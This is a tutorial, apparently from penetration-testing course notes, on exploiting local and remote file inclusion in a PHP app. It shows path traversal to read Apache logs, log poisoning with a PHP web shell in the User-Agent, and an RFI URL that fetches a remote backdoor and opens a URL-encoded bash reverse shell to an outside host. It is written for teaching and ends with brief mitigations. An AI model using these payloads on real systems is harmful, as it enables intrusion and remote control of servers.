# File Inclusion Vulnerabilities: LFI and RFI RCE with URL encoding

## Local File Inclusion (LFI)

### Overview

Local File Inclusion (LFI) vulnerabilities allow attackers to include files from the server's filesystem into the running code of a web application. This can lead to Remote Code Execution (RCE) if the included files contain executable code.

### Difference Between LFI and Directory Traversal

- **Directory Traversal**: Allows reading files outside the web root directory.
- **File Inclusion**: Allows including and potentially executing files within the web application's running code.

### Exploiting LFI with Log Poisoning

#### Step-by-Step Example

1. **Identify the Vulnerability**: Find a vulnerable parameter in the web application that accepts file paths.
2. **Modify Log Entries**: Use tools like `curl` to send data to the web application that gets logged.
3. **Include the Log File**: Use the LFI vulnerability to include the modified log file, executing the payload.

#### Practical Example

```bash
kali@kali:~$ curl http://example.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
Modify the User Agent in Burp Suite to include a PHP code snippet:
```bash
<?php echo system($_GET['cmd']); ?>
```
Send the modified request and include the log file:
```bash
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```
Output Example
```bash
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```
# Remote File Inclusion (RFI)
## Overview

Remote File Inclusion (RFI) vulnerabilities allow attackers to include files from remote servers. This can be more dangerous than LFI because it allows attackers to execute code from external sources.
Exploiting RFI
Step-by-Step Example

    Identify the Vulnerability: Find a vulnerable parameter in the web application that accepts file paths.
    Host a Malicious File: Prepare and host a malicious PHP file on a remote server.
    Craft the Exploit URL: Include the remote file in the vulnerable parameter and pass commands to it.

Practical Example
```bash
curl "http://example.com/meteor/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
```

### Conclusion

By understanding and exploiting RFI vulnerabilities, attackers can include and execute remote files on a target system, leading to severe security breaches. Proper security measures, such as disabling allow_url_include and validating input parameters, are essential to prevent such attacks.


